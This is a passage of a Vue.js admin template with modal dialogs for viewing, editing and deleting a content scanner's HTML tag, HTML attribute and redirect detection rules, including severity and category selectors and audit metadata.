              <p class="text-foreground font-medium pl-5">{{ formatUserInfo(selectedRedirectRule.updated_by) }}</p>
            </div>
          </div>
        </div>

        <!-- Modal Footer -->
        <div class="pt-4 border-t border-border flex items-center justify-end gap-2">
          <button 
            type="button" 
            @click="closeRedirectViewModal"
            class="h-9 px-5 bg-muted hover:bg-muted/80 text-foreground rounded-xl text-xs font-bold transition-colors cursor-pointer"
          >
            Close
          </button>
        </div>
      </div>
    </UiAdminModal>

    <!-- ========================================== -->
    <!-- MODAL: VIEW HTML TAG RULE DETAILS -->
    <!-- ========================================== -->
    <UiAdminModal
      :is-open="htmlTagModalState.isView.value"
      :title="isHtmlTagDetailsLoading ? 'Loading HTML Tag Rule...' : (selectedHtmlTagRule ? `HTML Tag Rule #${selectedHtmlTagRule.id}` : 'HTML Tag Rule Details')"
      subtitle="Comprehensive security inspection parameters and audit metadata."
      max-width="max-w-2xl"
      @close="closeHtmlTagViewModal"
    >
      <!-- Loading State -->
      <div v-if="isHtmlTagDetailsLoading" class="p-12 flex flex-col items-center justify-center gap-3 text-center">
        <Loader2 class="w-8 h-8 animate-spin text-primary" />
        <p class="text-xs font-semibold text-muted-foreground">Retrieving HTML tag rule details from security registry...</p>
      </div>

      <!-- Error / Not Found State -->
      <div v-else-if="!selectedHtmlTagRule" class="p-12 flex flex-col items-center justify-center gap-3 text-center">
        <div class="w-12 h-12 rounded-2xl bg-destructive/10 text-destructive flex items-center justify-center">
          <AlertCircle class="w-6 h-6" />
        </div>
        <p class="text-sm font-bold text-foreground">Rule Details Not Available</p>
        <p class="text-xs text-muted-foreground">Could not load the requested HTML tag rule from the security engine.</p>
        <button 
          type="button"
          @click="closeHtmlTagViewModal"
          class="mt-2 h-9 px-4 bg-muted hover:bg-muted/80 text-foreground rounded-xl text-xs font-bold transition-colors cursor-pointer"
        >
          Close
        </button>
      </div>

      <!-- Loaded Details View -->
      <div v-else class="p-6 sm:p-8 space-y-6">
        <!-- Hero Summary Card -->
        <div class="flex flex-col sm:flex-row items-start sm:items-center justify-between gap-4 p-5 bg-muted/40 rounded-2xl border border-border">
          <div class="space-y-1.5 min-w-0">
            <div class="flex items-center gap-2 flex-wrap">
              <span class="text-[10px] uppercase font-bold tracking-widest text-muted-foreground">Tag / Pattern</span>
            </div>
            <div class="font-mono text-base sm:text-lg font-bold text-foreground bg-background px-3 py-1.5 rounded-xl border border-border shadow-2xs inline-block break-all">
              &lt;{{ selectedHtmlTagRule.tag || selectedHtmlTagRule.pattern }}&gt;
            </div>
          </div>

          <div class="flex items-center gap-2 shrink-0 flex-wrap">
            <!-- Severity Badge -->
            <span :class="cn('px-3 py-1 rounded-full text-xs font-extrabold uppercase tracking-wider border', getSeverityBadge(selectedHtmlTagRule.severity))">
              {{ selectedHtmlTagRule.severity }}
            </span>
          </div>
        </div>

        <!-- Rule Specifications Grid -->
        <div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
          <!-- Category -->
          <div class="p-4 bg-card border border-border rounded-xl space-y-1">
            <span class="text-[10px] font-bold uppercase tracking-wider text-muted-foreground">Category</span>
            <p class="text-sm font-bold text-foreground">{{ selectedHtmlTagRule.category }}</p>
          </div>

          <!-- Status Indicators -->
          <div class="p-4 bg-card border border-border rounded-xl space-y-2">
            <span class="text-[10px] font-bold uppercase tracking-wider text-muted-foreground">Operational Status</span>
            <div class="flex items-center gap-3">
              <!-- Enabled Status -->
              <span 
                :class="cn(
                  'px-2.5 py-0.5 rounded-full text-[10px] font-extrabold uppercase tracking-wider border flex items-center gap-1.5',
                  selectedHtmlTagRule.is_enabled 
                  ? 'bg-emerald-500/10 text-emerald-600 border-emerald-500/30' 
                  : 'bg-muted text-muted-foreground border-border'
                )"
              >
                <span :class="cn('w-1.5 h-1.5 rounded-full', selectedHtmlTagRule.is_enabled ? 'bg-emerald-500' : 'bg-muted-foreground')"></span>
                <span>{{ selectedHtmlTagRule.is_enabled ? 'Enabled' : 'Disabled' }}</span>
              </span>

              <!-- Active Status -->
              <span 
                :class="cn(
                  'px-2.5 py-0.5 rounded-full text-[10px] font-extrabold uppercase tracking-wider border flex items-center gap-1.5',
                  selectedHtmlTagRule.is_active 
                  ? 'bg-emerald-500/10 text-emerald-600 border-emerald-500/30' 
                  : 'bg-muted text-muted-foreground border-border'
                )"
              >
                <span :class="cn('w-1.5 h-1.5 rounded-full', selectedHtmlTagRule.is_active ? 'bg-emerald-500' : 'bg-muted-foreground')"></span>
                <span>{{ selectedHtmlTagRule.is_active ? 'Active' : 'Inactive' }}</span>
              </span>
            </div>
          </div>
        </div>

        <!-- Description Section -->
        <div class="space-y-1.5">
          <span class="text-[10px] font-bold uppercase tracking-wider text-muted-foreground">Rule Description & Rationale</span>
          <div class="bg-card border border-border rounded-xl p-4 text-xs font-medium text-foreground leading-relaxed">
            <p v-if="selectedHtmlTagRule.description?.trim()">{{ selectedHtmlTagRule.description }}</p>
            <p v-else class="text-muted-foreground italic">No description provided for this rule.</p>
          </div>
        </div>

        <!-- Audit & Tracking Metadata -->
        <div class="space-y-2 pt-2 border-t border-border">
          <span class="text-[10px] font-bold uppercase tracking-wider text-muted-foreground">Audit & Lifecycle Metadata</span>
          <div class="bg-muted/30 border border-border rounded-xl p-4 grid grid-cols-1 sm:grid-cols-2 gap-4 text-xs">
            <div class="space-y-1">
              <div class="flex items-center gap-1.5 text-muted-foreground">
                <Calendar class="w-3.5 h-3.5" />
                <span class="font-semibold">Created At:</span>
              </div>
              <p class="font-mono text-foreground font-medium pl-5">{{ formatDate(selectedHtmlTagRule.created_at) }}</p>
            </div>

            <div class="space-y-1">
              <div class="flex items-center gap-1.5 text-muted-foreground">
                <Calendar class="w-3.5 h-3.5" />
                <span class="font-semibold">Updated At:</span>
              </div>
              <p class="font-mono text-foreground font-medium pl-5">{{ formatDate(selectedHtmlTagRule.updated_at) }}</p>
            </div>

            <div class="space-y-1">
              <div class="flex items-center gap-1.5 text-muted-foreground">
                <User class="w-3.5 h-3.5" />
                <span class="font-semibold">Created By:</span>
              </div>
              <p class="text-foreground font-medium pl-5">{{ formatUserInfo(selectedHtmlTagRule.created_by) }}</p>
            </div>

            <div class="space-y-1">
              <div class="flex items-center gap-1.5 text-muted-foreground">
                <User class="w-3.5 h-3.5" />
                <span class="font-semibold">Updated By:</span>
              </div>
              <p class="text-foreground font-medium pl-5">{{ formatUserInfo(selectedHtmlTagRule.updated_by) }}</p>
            </div>
          </div>
        </div>

        <!-- Modal Footer -->
        <div class="pt-4 border-t border-border flex items-center justify-end gap-2">
          <button 
            type="button" 
            @click="closeHtmlTagViewModal"
            class="h-9 px-5 bg-muted hover:bg-muted/80 text-foreground rounded-xl text-xs font-bold transition-colors cursor-pointer"
          >
            Close
          </button>
        </div>
      </div>
    </UiAdminModal>

    <!-- ========================================== -->
    <!-- MODAL: EDIT HTML TAG RULE -->
    <!-- ========================================== -->
    <UiAdminModal
      :is-open="htmlTagModalState.isEdit.value"
      :title="isHtmlTagDetailsLoading ? 'Loading HTML Tag Rule...' : (editingHtmlTagRuleId ? `Edit HTML Tag Rule #${editingHtmlTagRuleId}` : 'Edit HTML Tag Rule')"
      subtitle="Update pattern heuristics and classification parameters for this HTML tag rule."
      max-width="max-w-lg"
      @close="closeHtmlTagEditModal"
    >
      <!-- Loading State -->
      <div v-if="isHtmlTagDetailsLoading" class="p-12 flex flex-col items-center justify-center gap-3 text-center">
        <Loader2 class="w-8 h-8 animate-spin text-primary" />
        <p class="text-xs font-semibold text-muted-foreground">Retrieving HTML tag rule details for editing...</p>
      </div>

      <!-- Form -->
      <form v-else @submit.prevent="submitUpdateHtmlTagRule" class="p-6 space-y-4">
        <!-- Tag / Pattern -->
        <div class="space-y-1.5">
          <label class="text-xs font-bold text-foreground">
            Tag / Pattern <span class="text-rose-500">*</span>
          </label>
          <input 
            v-model="htmlTagEditForm.tag"
            type="text" 
            placeholder="e.g. script, iframe, object, embed, etc."
            class="w-full h-10 px-3 bg-background border border-input rounded-xl text-xs font-mono font-medium text-foreground outline-none focus:ring-2 focus:ring-ring/20 transition-all"
            required
          />
        </div>

        <!-- Category & Severity Grid -->
        <div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
          <!-- Category -->
          <div class="space-y-1.5">
            <label class="text-xs font-bold text-foreground">
              Category <span class="text-rose-500">*</span>
            </label>
            <select 
              v-model="htmlTagEditForm.category"
              class="w-full h-10 px-3 bg-background border border-input rounded-xl text-xs font-semibold text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
            >
              <option value="DANGEROUS_TAGS">Dangerous Tags</option>
              <option value="EMBEDDED_CONTENT">Embedded Content</option>
              <option value="PLUGIN_OBJECTS">Plugin Objects</option>
              <option value="DOM_HIJACKING">DOM Hijacking</option>
              <option value="INJECTION">Injection</option>
              <option value="PHISHING">Phishing</option>
              <option value="MALWARE">Malware</option>
              <option value="OBFUSCATION">Obfuscation</option>
              <option value="REDIRECT">Redirect</option>
              <option value="SCAM">Scam</option>
              <option value="SPAM">Spam</option>
              <option value="HIDDEN_CONTENT">Hidden Content</option>
              <option value="ADULT">Adult</option>
              <option value="DRUG">Drug</option>
              <option value="GAMBLING">Gambling</option>
            </select>
          </div>

          <!-- Severity -->
          <div class="space-y-1.5">
            <label class="text-xs font-bold text-foreground">
              Severity Level <span class="text-rose-500">*</span>
            </label>
            <select 
              v-model="htmlTagEditForm.severity"
              class="w-full h-10 px-3 bg-background border border-input rounded-xl text-xs font-semibold text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
            >
              <option value="CRITICAL">Critical</option>
              <option value="HIGH">High</option>
              <option value="MEDIUM">Medium</option>
              <option value="LOW">Low</option>
              <option value="INFO">Info</option>
            </select>
          </div>
        </div>

        <!-- Description -->
        <div class="space-y-1.5">
          <label class="text-xs font-bold text-foreground">
            Rule Description & Rationale
          </label>
          <textarea 
            v-model="htmlTagEditForm.description"
            rows="3"
            placeholder="Document why this HTML tag pattern was established, targeted vectors, and false positive safeguards..."
            class="w-full p-3 bg-background border border-input rounded-xl text-xs font-medium text-foreground outline-none focus:ring-2 focus:ring-ring/20 transition-all resize-none leading-relaxed"
          ></textarea>
        </div>

        <!-- Enabled Toggle -->
        <div class="flex items-center justify-between p-3 bg-muted/40 rounded-xl border border-border">
          <div class="space-y-0.5">
            <label class="text-xs font-bold text-foreground cursor-pointer" for="edit-tag-enabled">
              Rule Enabled
            </label>
            <p class="text-[10px] text-muted-foreground font-medium">
              Active rules are evaluated during content security scans.
            </p>
          </div>
          <input 
            id="edit-tag-enabled"
            v-model="htmlTagEditForm.is_enabled"
            type="checkbox" 
            class="w-4 h-4 rounded border-border text-primary focus:ring-primary/20 accent-primary cursor-pointer"
          />
        </div>

        <!-- Form Actions -->
        <div class="pt-3 border-t border-border flex items-center justify-end gap-2">
          <button 
            type="button" 
            :disabled="isSubmittingHtmlTagEdit"
            @click="closeHtmlTagEditModal"
            class="h-9 px-4 rounded-xl text-xs font-bold text-muted-foreground hover:bg-muted transition-colors disabled:opacity-50 cursor-pointer"
          >
            Cancel
          </button>
          <button 
            type="submit" 
            :disabled="isSubmittingHtmlTagEdit"
            class="h-9 px-5 bg-primary text-primary-foreground rounded-xl text-xs font-bold hover:bg-primary/90 transition-colors shadow-xs flex items-center gap-1.5 disabled:opacity-70 cursor-pointer"
          >
            <Loader2 v-if="isSubmittingHtmlTagEdit" class="w-3.5 h-3.5 animate-spin" />
            <span>{{ isSubmittingHtmlTagEdit ? 'Saving Changes...' : 'Save Changes' }}</span>
          </button>
        </div>
      </form>
    </UiAdminModal>

    <!-- ========================================== -->
    <!-- MODAL: DELETE HTML TAG RULE -->
    <!-- ========================================== -->
    <UiAdminModal
      :is-open="htmlTagModalState.isDelete.value"
      title="Delete HTML Tag Rule"
      subtitle="Confirm permanent deletion of this HTML tag rule from content inspection parameters."
      max-width="max-w-md"
      @close="closeHtmlTagDeleteModal"
    >
      <div class="p-6 space-y-4">
        <div class="p-4 bg-rose-500/10 border border-rose-500/20 rounded-2xl flex gap-3">
          <AlertTriangle class="w-5 h-5 text-rose-500 shrink-0 mt-0.5" />
          <div class="space-y-1">
            <h4 class="text-xs font-bold text-rose-500">Critical Confirmation</h4>
            <p class="text-[10px] text-rose-500/80 font-medium leading-relaxed">
              Deletions are non-reversible. Once deleted, this rule is instantly expunged, and future content security scanners will no longer target this tag heuristic.
            </p>
          </div>
        </div>

        <div class="space-y-2">
          <p class="text-xs text-foreground font-semibold">
            Are you sure you want to delete this rule?
          </p>
          <p class="text-xs text-muted-foreground leading-relaxed">
            Rule tag / pattern <span class="font-mono font-bold text-foreground">{{ deletingHtmlTagRule?.tag || (selectedHtmlTagRule ? (selectedHtmlTagRule.tag || selectedHtmlTagRule.pattern) : `ID #${htmlTagModalState.activeId.value}`) }}</span> will be permanently removed from active content inspection heuristics.
          </p>
        </div>

        <div class="pt-3 border-t border-border flex items-center justify-end gap-2">
          <button 
            type="button" 
            :disabled="isDeletingHtmlTagRule"
            @click="closeHtmlTagDeleteModal"
            class="h-9 px-4 rounded-xl text-xs font-bold text-muted-foreground hover:bg-muted transition-colors disabled:opacity-50 cursor-pointer"
          >
            Cancel
          </button>
          <button 
            type="button" 
            :disabled="isDeletingHtmlTagRule"
            @click="executeDeleteHtmlTagRule"
            class="h-9 px-5 bg-rose-600 hover:bg-rose-700 text-white rounded-xl text-xs font-bold transition-colors shadow-xs flex items-center gap-1.5 disabled:opacity-70 cursor-pointer"
          >
            <Loader2 v-if="isDeletingHtmlTagRule" class="w-3.5 h-3.5 animate-spin" />
            <span>{{ isDeletingHtmlTagRule ? 'Deleting...' : 'Delete Rule' }}</span>
          </button>
        </div>
      </div>
    </UiAdminModal>

    <!-- ========================================== -->
    <!-- MODAL: VIEW HTML ATTRIBUTE RULE DETAILS -->
    <!-- ========================================== -->
    <UiAdminModal
      :is-open="htmlAttributeModalState.isView.value"
      :title="isHtmlAttributeDetailsLoading ? 'Loading HTML Attribute Rule...' : (selectedHtmlAttributeRule ? `HTML Attribute Rule #${selectedHtmlAttributeRule.id}` : 'HTML Attribute Rule Details')"
      subtitle="Comprehensive security inspection parameters and audit metadata."
      max-width="max-w-2xl"
      @close="closeHtmlAttributeViewModal"
    >
      <!-- Loading State -->
      <div v-if="isHtmlAttributeDetailsLoading" class="p-12 flex flex-col items-center justify-center gap-3 text-center">
        <Loader2 class="w-8 h-8 animate-spin text-primary" />
        <p class="text-xs font-semibold text-muted-foreground">Retrieving HTML attribute rule details from security registry...</p>
      </div>

      <!-- Error / Not Found State -->
      <div v-else-if="!selectedHtmlAttributeRule" class="p-12 flex flex-col items-center justify-center gap-3 text-center">
        <div class="w-12 h-12 rounded-2xl bg-destructive/10 text-destructive flex items-center justify-center">
          <AlertCircle class="w-6 h-6" />
        </div>
        <p class="text-sm font-bold text-foreground">Rule Details Not Available</p>
        <p class="text-xs text-muted-foreground">Could not load the requested HTML attribute rule from the security engine.</p>
        <button 
          type="button"
          @click="closeHtmlAttributeViewModal"
          class="mt-2 h-9 px-4 bg-muted hover:bg-muted/80 text-foreground rounded-xl text-xs font-bold transition-colors cursor-pointer"
        >
          Close
        </button>
      </div>

      <!-- Loaded Details View -->
      <div v-else class="p-6 sm:p-8 space-y-6">
        <!-- Hero Summary Card -->
        <div class="flex flex-col sm:flex-row items-start sm:items-center justify-between gap-4 p-5 bg-muted/40 rounded-2xl border border-border">
          <div class="space-y-1.5 min-w-0">
            <div class="flex items-center gap-2 flex-wrap">
              <span class="text-[10px] uppercase font-bold tracking-widest text-muted-foreground">Attribute / Pattern</span>
            </div>
            <div class="font-mono text-base sm:text-lg font-bold text-foreground bg-background px-3 py-1.5 rounded-xl border border-border shadow-2xs inline-block break-all">
              {{ selectedHtmlAttributeRule.attribute || selectedHtmlAttributeRule.pattern }}
            </div>
          </div>

          <div class="flex items-center gap-2 shrink-0 flex-wrap">
            <!-- Severity Badge -->
            <span :class="cn('px-3 py-1 rounded-full text-xs font-extrabold uppercase tracking-wider border', getSeverityBadge(selectedHtmlAttributeRule.severity))">
              {{ selectedHtmlAttributeRule.severity }}
            </span>
          </div>
        </div>

        <!-- Rule Specifications Grid -->
        <div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
          <!-- Category -->
          <div class="p-4 bg-card border border-border rounded-xl space-y-1">
            <span class="text-[10px] font-bold uppercase tracking-wider text-muted-foreground">Category</span>
            <p class="text-sm font-bold text-foreground">{{ selectedHtmlAttributeRule.category }}</p>
          </div>

          <!-- Status Indicators -->
          <div class="p-4 bg-card border border-border rounded-xl space-y-2">
            <span class="text-[10px] font-bold uppercase tracking-wider text-muted-foreground">Operational Status</span>
            <div class="flex items-center gap-3">
              <!-- Enabled Status -->
              <span 
                :class="cn(
                  'px-2.5 py-0.5 rounded-full text-[10px] font-extrabold uppercase tracking-wider border flex items-center gap-1.5',
                  selectedHtmlAttributeRule.is_enabled 
                    ? 'bg-emerald-500/10 text-emerald-600 border-emerald-500/30' 
                    : 'bg-muted text-muted-foreground border-border'
                )"
              >
                <span :class="cn('w-1.5 h-1.5 rounded-full', selectedHtmlAttributeRule.is_enabled ? 'bg-emerald-500' : 'bg-muted-foreground')"></span>
                <span>{{ selectedHtmlAttributeRule.is_enabled ? 'Enabled' : 'Disabled' }}</span>
              </span>

              <!-- Active Status -->
              <span 
                :class="cn(
                  'px-2.5 py-0.5 rounded-full text-[10px] font-extrabold uppercase tracking-wider border flex items-center gap-1.5',
                  selectedHtmlAttributeRule.is_active 
                    ? 'bg-emerald-500/10 text-emerald-600 border-emerald-500/30' 
                    : 'bg-muted text-muted-foreground border-border'
                )"
              >
                <span :class="cn('w-1.5 h-1.5 rounded-full', selectedHtmlAttributeRule.is_active ? 'bg-emerald-500' : 'bg-muted-foreground')"></span>
                <span>{{ selectedHtmlAttributeRule.is_active ? 'Active' : 'Inactive' }}</span>
              </span>
            </div>
          </div>
        </div>

        <!-- Description Section -->
        <div class="space-y-1.5">
          <span class="text-[10px] font-bold uppercase tracking-wider text-muted-foreground">Rule Description & Rationale</span>
          <div class="bg-card border border-border rounded-xl p-4 text-xs font-medium text-foreground leading-relaxed">
            <p v-if="selectedHtmlAttributeRule.description?.trim()">{{ selectedHtmlAttributeRule.description }}</p>
            <p v-else class="text-muted-foreground italic">No description provided for this rule.</p>
          </div>
        </div>

        <!-- Audit & Tracking Metadata -->
        <div class="space-y-2 pt-2 border-t border-border">
          <span class="text-[10px] font-bold uppercase tracking-wider text-muted-foreground">Audit & Lifecycle Metadata</span>
          <div class="bg-muted/30 border border-border rounded-xl p-4 grid grid-cols-1 sm:grid-cols-2 gap-4 text-xs">
            <div class="space-y-1">
              <div class="flex items-center gap-1.5 text-muted-foreground">
                <Calendar class="w-3.5 h-3.5" />
                <span class="font-semibold">Created At:</span>
              </div>
              <p class="font-mono text-foreground font-medium pl-5">{{ formatDate(selectedHtmlAttributeRule.created_at) }}</p>
            </div>

            <div class="space-y-1">
              <div class="flex items-center gap-1.5 text-muted-foreground">
                <Calendar class="w-3.5 h-3.5" />
                <span class="font-semibold">Updated At:</span>
              </div>
              <p class="font-mono text-foreground font-medium pl-5">{{ formatDate(selectedHtmlAttributeRule.updated_at) }}</p>
            </div>

            <div class="space-y-1">
              <div class="flex items-center gap-1.5 text-muted-foreground">
                <User class="w-3.5 h-3.5" />
                <span class="font-semibold">Created By:</span>
              </div>
              <p class="text-foreground font-medium pl-5">{{ formatUserInfo(selectedHtmlAttributeRule.created_by) }}</p>
            </div>

            <div class="space-y-1">
              <div class="flex items-center gap-1.5 text-muted-foreground">
                <User class="w-3.5 h-3.5" />
                <span class="font-semibold">Updated By:</span>
              </div>
              <p class="text-foreground font-medium pl-5">{{ formatUserInfo(selectedHtmlAttributeRule.updated_by) }}</p>
            </div>
          </div>
        </div>

        <!-- Modal Footer -->
        <div class="pt-4 border-t border-border flex items-center justify-end gap-2">
          <button 
            type="button" 
            @click="closeHtmlAttributeViewModal"
            class="h-9 px-5 bg-muted hover:bg-muted/80 text-foreground rounded-xl text-xs font-bold transition-colors cursor-pointer"
          >
            Close
          </button>
        </div>
      </div>
    </UiAdminModal>

    <!-- ========================================== -->
    <!-- MODAL: EDIT HTML ATTRIBUTE RULE -->
    <!-- ========================================== -->
    <UiAdminModal
      :is-open="htmlAttributeModalState.isEdit.value"
      :title="isHtmlAttributeDetailsLoading ? 'Loading HTML Attribute Rule...' : (editingHtmlAttributeRuleId ? `Edit HTML Attribute Rule #${editingHtmlAttributeRuleId}` : 'Edit HTML Attribute Rule')"
      subtitle="Update pattern heuristics and classification parameters for this HTML attribute rule."
      max-width="max-w-lg"
      @close="closeHtmlAttributeEditModal"
    >
      <!-- Loading State -->
      <div v-if="isHtmlAttributeDetailsLoading" class="p-12 flex flex-col items-center justify-center gap-3 text-center">
        <Loader2 class="w-8 h-8 animate-spin text-primary" />
        <p class="text-xs font-semibold text-muted-foreground">Retrieving HTML attribute rule details for editing...</p>
      </div>

      <!-- Form -->
      <form v-else @submit.prevent="submitUpdateHtmlAttributeRule" class="p-6 space-y-4">
        <!-- Attribute / Pattern -->
        <div class="space-y-1.5">
          <label class="text-xs font-bold text-foreground">
            Attribute / Pattern <span class="text-rose-500">*</span>
          </label>
          <input 
            v-model="htmlAttributeEditForm.attribute"
            type="text" 
            placeholder="e.g. onerror, onclick, onload, javascript:"
            class="w-full h-10 px-3 bg-background border border-input rounded-xl text-xs font-mono font-medium text-foreground outline-none focus:ring-2 focus:ring-ring/20 transition-all"
            required
          />
        </div>

        <!-- Category & Severity Grid -->
        <div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
          <!-- Category -->
          <div class="space-y-1.5">
            <label class="text-xs font-bold text-foreground">
              Category <span class="text-rose-500">*</span>
            </label>
            <select 
              v-model="htmlAttributeEditForm.category"
              class="w-full h-10 px-3 bg-background border border-input rounded-xl text-xs font-semibold text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
            >
              <option value="INJECTION">Injection</option>
              <option value="PHISHING">Phishing</option>
              <option value="MALWARE">Malware</option>
              <option value="OBFUSCATION">Obfuscation</option>
              <option value="REDIRECT">Redirect</option>
              <option value="SCAM">Scam</option>
              <option value="SPAM">Spam</option>
              <option value="HIDDEN_CONTENT">Hidden Content</option>
              <option value="ADULT">Adult</option>
              <option value="DRUG">Drug</option>
              <option value="GAMBLING">Gambling</option>
            </select>
          </div>

          <!-- Severity -->
          <div class="space-y-1.5">
            <label class="text-xs font-bold text-foreground">
              Severity Level <span class="text-rose-500">*</span>
            </label>
            <select 
              v-model="htmlAttributeEditForm.severity"
              class="w-full h-10 px-3 bg-background border border-input rounded-xl text-xs font-semibold text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
            >
              <option value="CRITICAL">Critical</option>
              <option value="HIGH">High</option>
              <option value="MEDIUM">Medium</option>
              <option value="LOW">Low</option>
              <option value="INFO">Info</option>
            </select>
          </div>
        </div>

        <!-- Description -->
        <div class="space-y-1.5">
          <label class="text-xs font-bold text-foreground">
            Rule Description & Rationale
          </label>
          <textarea 
            v-model="htmlAttributeEditForm.description"
            rows="3"
            placeholder="Document why this HTML attribute or event handler pattern was established, targeted vectors, and false positive safeguards..."
            class="w-full p-3 bg-background border border-input rounded-xl text-xs font-medium text-foreground outline-none focus:ring-2 focus:ring-ring/20 transition-all resize-none leading-relaxed"
          ></textarea>
        </div>

        <!-- Enabled Toggle -->
        <div class="flex items-center justify-between p-3 bg-muted/40 rounded-xl border border-border">
          <div class="space-y-0.5">
            <label class="text-xs font-bold text-foreground cursor-pointer" for="edit-attribute-enabled">
              Rule Enabled
            </label>
            <p class="text-[10px] text-muted-foreground font-medium">
              Active rules are evaluated during content security scans.
            </p>
          </div>
          <input 
            id="edit-attribute-enabled"
            v-model="htmlAttributeEditForm.is_enabled"
            type="checkbox" 
            class="w-4 h-4 rounded border-border text-primary focus:ring-primary/20 accent-primary cursor-pointer"
          />
        </div>

        <!-- Form Actions -->
        <div class="pt-3 border-t border-border flex items-center justify-end gap-2">
          <button 
            type="button" 
            :disabled="isSubmittingHtmlAttributeEdit"
            @click="closeHtmlAttributeEditModal"
            class="h-9 px-4 rounded-xl text-xs font-bold text-muted-foreground hover:bg-muted transition-colors disabled:opacity-50 cursor-pointer"
          >
            Cancel
          </button>
          <button 
            type="submit" 
            :disabled="isSubmittingHtmlAttributeEdit"
            class="h-9 px-5 bg-primary text-primary-foreground rounded-xl text-xs font-bold hover:bg-primary/90 transition-colors shadow-xs flex items-center gap-1.5 disabled:opacity-70 cursor-pointer"
          >
            <Loader2 v-if="isSubmittingHtmlAttributeEdit" class="w-3.5 h-3.5 animate-spin" />
            <span>{{ isSubmittingHtmlAttributeEdit ? 'Saving Changes...' : 'Save Changes' }}</span>
          </button>
        </div>
      </form>
    </UiAdminModal>

    <!-- ========================================== -->
    <!-- MODAL: EDIT REDIRECT RULE -->
    <!-- ========================================== -->
    <UiAdminModal
      :is-open="redirectModalState.isEdit.value"
      :title="isRedirectDetailsLoading ? 'Loading Redirect Rule...' : (editingRedirectRuleId ? `Edit Redirect Rule #${editingRedirectRuleId}` : 'Edit Redirect Rule')"
      subtitle="Update pattern heuristics and classification parameters for this redirect rule."
      max-width="max-w-lg"
      @close="closeRedirectEditModal"
    >
      <!-- Loading State -->
      <div v-if="isRedirectDetailsLoading" class="p-12 flex flex-col items-center justify-center gap-3 text-center">
        <Loader2 class="w-8 h-8 animate-spin text-primary" />
        <p class="text-xs font-semibold text-muted-foreground">Retrieving redirect rule details for editing...</p>
      </div>

      <!-- Form -->
      <form v-else @submit.prevent="submitUpdateRedirectRule" class="p-6 space-y-4">
        <!-- Pattern / Heuristic -->
        <div class="space-y-1.5">
          <label class="text-xs font-bold text-foreground">
            Pattern / Redirect Sequence <span class="text-rose-500">*</span>
          </label>
          <input 
            v-model="redirectEditForm.pattern"
            type="text" 
            placeholder="e.g. http-equiv=&quot;refresh&quot;, window\.location, bit\.ly/"
            class="w-full h-9 px-3 bg-background border border-input rounded-xl text-xs font-mono text-foreground focus:ring-2 focus:ring-primary/20 focus:border-primary outline-none transition-all placeholder:text-muted-foreground/60"
            required
          />
          <p class="text-[11px] text-muted-foreground">
            Specify the pattern, script string, or heuristic sequence to detect unauthorized redirects or location overrides.
          </p>
        </div>

        <!-- Category & Severity Grid -->
        <div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
          <!-- Category -->
          <div class="space-y-1.5">
            <label class="text-xs font-bold text-foreground">
              Category <span class="text-rose-500">*</span>
            </label>
            <select 
              v-model="redirectEditForm.category"
              class="w-full h-9 px-3 bg-background border border-input rounded-xl text-xs font-semibold text-foreground focus:ring-2 focus:ring-primary/20 focus:border-primary outline-none transition-all cursor-pointer"
            >
              <option value="SPAM">Spam Blacklist</option>
              <option value="PHISHING">Phishing & Social Engineering</option>
              <option value="MALWARE">Malicious URLs & Payloads</option>
              <option value="POLICY">Policy & Regulatory Violation</option>
              <option value="REDIRECT">Redirect Rules</option>
              <option value="OTHER">Other Custom Heuristics</option>
            </select>
          </div>

          <!-- Severity -->
          <div class="space-y-1.5">
            <label class="text-xs font-bold text-foreground">
              Severity Level <span class="text-rose-500">*</span>
            </label>
            <select 
              v-model="redirectEditForm.severity"
              class="w-full h-9 px-3 bg-background border border-input rounded-xl text-xs font-semibold text-foreground focus:ring-2 focus:ring-primary/20 focus:border-primary outline-none transition-all cursor-pointer"
            >
              <option value="LOW">Low Risk</option>
              <option value="MEDIUM">Medium Risk</option>
              <option value="HIGH">High Risk</option>
              <option value="CRITICAL">Critical Severity</option>
            </select>
          </div>
        </div>

        <!-- Description -->
        <div class="space-y-1.5">
          <label class="text-xs font-bold text-foreground">
            Rule Description & Rationale
          </label>
          <textarea 
            v-model="redirectEditForm.description"
            rows="3"
            placeholder="Document why this redirect rule was established, targeted vectors, and false positive safeguards..."
            class="w-full p-3 bg-background border border-input rounded-xl text-xs font-medium text-foreground focus:ring-2 focus:ring-primary/20 focus:border-primary outline-none transition-all resize-none placeholder:text-muted-foreground/60 leading-relaxed"
          ></textarea>
        </div>

        <!-- Enabled Toggle -->
        <div class="pt-2 border-t border-border flex items-center justify-between">
          <div class="space-y-0.5">
            <label class="text-xs font-bold text-foreground cursor-pointer" for="edit-redirect-enabled">
              Enable Redirect Inspection
            </label>
            <p class="text-[11px] text-muted-foreground">
              When enabled, incoming content will actively be evaluated against this redirect pattern.
            </p>
          </div>
          <input 
            id="edit-redirect-enabled"
            v-model="redirectEditForm.is_enabled"
            type="checkbox" 
            class="w-4 h-4 rounded border-border text-primary focus:ring-primary/20 accent-primary cursor-pointer"
          />
        </div>

        <!-- Form Actions -->
        <div class="pt-3 border-t border-border flex items-center justify-end gap-2">
          <button 
            type="button" 
            :disabled="isSubmittingRedirectEdit"
            @click="closeRedirectEditModal"
            class="h-9 px-4 rounded-xl text-xs font-bold text-muted-foreground hover:bg-muted transition-colors disabled:opacity-50 cursor-pointer"
          >
            Cancel
          </button>
          <button 
            type="submit" 
            :disabled="isSubmittingRedirectEdit"
            class="h-9 px-5 bg-primary text-primary-foreground rounded-xl text-xs font-bold hover:bg-primary/90 transition-colors shadow-xs flex items-center gap-1.5 disabled:opacity-70 cursor-pointer"
          >
            <Loader2 v-if="isSubmittingRedirectEdit" class="w-3.5 h-3.5 animate-spin" />
            <span>{{ isSubmittingRedirectEdit ? 'Saving Changes...' : 'Save Changes' }}</span>
          </button>
        </div>
      </form>
    </UiAdminModal>

    <!-- ========================================== -->
    <!-- MODAL: DELETE HTML ATTRIBUTE RULE CONFIRMATION -->
    <!-- ========================================== -->
    <UiAdminModal
      :is-open="htmlAttributeModalState.isDelete.value"
      title="Delete HTML Attribute Rule"
